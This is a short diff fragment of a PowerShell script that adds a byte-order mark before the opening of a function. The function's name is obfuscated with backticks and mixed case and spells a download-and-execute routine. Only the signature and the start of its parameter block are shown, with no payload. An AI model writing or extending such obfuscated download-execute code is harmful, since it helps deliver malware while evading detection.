@@ -1,4 +1,4 @@
-function D`O`WNlOAd-`eX`Ec`UTE-`Ps {
+﻿function D`O`WNlOAd-`eX`Ec`UTE-`Ps {
     [CmdletBinding()]
     param(
         [Parameter(mANdAtoRY = $true)]
